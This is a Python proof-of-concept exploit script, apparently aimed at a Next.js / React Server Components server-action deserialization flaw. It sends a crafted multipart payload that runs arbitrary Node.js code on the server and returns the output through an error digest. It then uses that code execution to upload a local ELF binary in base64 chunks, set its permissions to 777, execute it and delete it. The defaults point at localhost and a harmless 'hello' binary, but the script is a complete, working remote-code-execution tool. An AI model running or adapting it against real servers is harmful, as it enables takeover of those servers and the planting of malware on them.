import base64
import codecs
import json
import os
import sys

import requests

# --- Configuration ---
ENV_SUFFIX = os.environ.get("ENV_SUFFIX", "_test")
NO_CLEANUP = os.environ.get("NO_CLEANUP", "false").lower() == "true"


# --- Core Exploit Logic ---
def send_js_payload(base_url, step_name, js_body):
    """Sends a raw JS payload to the vulnerable endpoint."""
    print(f"  [+] Step: {step_name}")

    full_js_payload = f"""
    (function() {{
        var output = {{ "step": "{step_name}" }};
        try {{
            const fs = process.mainModule.require('fs');
            const cp = process.mainModule.require('child_process');
            {js_body}
            output.success = true;
        }} catch (e) {{
            output.success = false;
            output.error = e.message;
            output.code = e.code;
        }}
        var jsonOut = JSON.stringify(output);
        throw Object.assign(new Error('NEXT_REDIRECT'), {{ "digest": '`' + jsonOut + '`' }});
    }})();
    """

    minified_payload = " ".join(full_js_payload.split())
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{ "then": "$B0"}',
        "_response": {
            "_prefix": minified_payload,
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"')
    }

    headers = {"Next-Action": "x"}

    try:
        res = requests.post(base_url, files=files, headers=headers, timeout=30)
        if 'digest' in res.text:
            start = res.text.find('`{') + 1
            end = res.text.rfind('}`') + 1
            if start > 0 and end > 0:
                raw_json = res.text[start:end]
                raw_json = codecs.decode(raw_json, "unicode_escape")
                try:
                    data = json.loads(raw_json)
                    print(f"      Result: {json.dumps(data, indent=2)}")
                    return data
                except json.JSONDecodeError:
                    print(f"      Raw Digest (Parse Error): {raw_json}")
                    return {"success": False, "raw": raw_json}
            else:
                print(f"      No valid JSON digest found in response.")
        else:
            print(f"      Status: {res.status_code} (No digest found)")
    except requests.exceptions.RequestException as e:
        print(f"      Request failed: {e}")
    return None

# --- Attack Scenarios ---
def run_dropped_binary_attack(base_url, binary_path, target_file, exec_args):
    if not os.path.exists(binary_path):
        print(f"Error: Binary '{binary_path}' not found.")
        return

    print(f"\n--- Attack Vector: Dropping ELF Binary '{os.path.basename(binary_path)}' to '{target_file}' ---")

    # 1. Cleanup
    cleanup_code = f"try {{ fs.unlinkSync('{target_file}'); }} catch (e) {{ /* ignore */ }}"
    send_js_payload(base_url, f"Pre-run Cleanup", cleanup_code)

    # 2. Chunked Write
    CHUNK_SIZE = 500 * 1024  # 500KB chunks
    with open(binary_path, "rb") as f:
        chunk_idx = 0
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break

            b64_chunk = base64.b64encode(chunk).decode('utf-8')
            if chunk_idx == 0:
                # First chunk: write new file
                code_write = f"fs.writeFileSync('{target_file}', Buffer.from('{b64_chunk}', 'base64'));"
                step_label = f"1. Write Initial Chunk to {target_file}"
            else:
                # Subsequent chunks: append
                code_write = f"fs.appendFileSync('{target_file}', Buffer.from('{b64_chunk}', 'base64'));"
                step_label = f"1.{chunk_idx} Append Chunk to {target_file}"

            res = send_js_payload(base_url, step_label, code_write)
            if not res or res.get('success') is not True:
                print(f"      Attack STOPPED: Could not write/append chunk {chunk_idx}.")
                return

            chunk_idx += 1

    # 3. Verify
    verify_code = f"output.verification = fs.statSync('{target_file}');"
    send_js_payload(base_url, f"2. Verify Binary was Written", verify_code)

    # 4. Chmod
    chmod_code = f"fs.chmodSync('{target_file}', 0o777);"
    send_js_payload(base_url, f"3. Chmod Binary to 777", chmod_code)

    # 5. Execute
    args_str = json.dumps(exec_args)
    exec_code = f"""
    const r = cp.spawnSync('{target_file}', {args_str});
    output.stdout = r.stdout ? r.stdout.toString() : '';
    output.stderr = r.stderr ? r.stderr.toString() : '';
    output.error_obj = r.error ? {{ "message": r.error.message, "code": r.error.code }} : null;
    """
    send_js_payload(base_url, f"4. Execute Binary", exec_code)

    # 6. Cleanup
    if not NO_CLEANUP:
        send_js_payload(base_url, "Post-run Cleanup", cleanup_code)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <TARGET_URL>")
        print("Example: python exploit/poc_advanced.py http://localhost:3001")
        sys.exit(1)

    target_url = sys.argv[1]

    if NO_CLEANUP:
        print("Cleanup is DISABLED.")

    # Use the pre-compiled binary
    script_dir = os.path.dirname(os.path.abspath(__file__))
    binary_path = os.path.join(script_dir, "dist", "hello-linux-amd64")

    if os.path.exists(binary_path):
        hello_target = f"/tmp/hello{ENV_SUFFIX}"

        print(f"\n--- Targeting app at: {target_url} ---")
        run_dropped_binary_attack(target_url, binary_path, hello_target, [])
    else:
        print(f"Skipping attack. Binary not found at: {binary_path}")
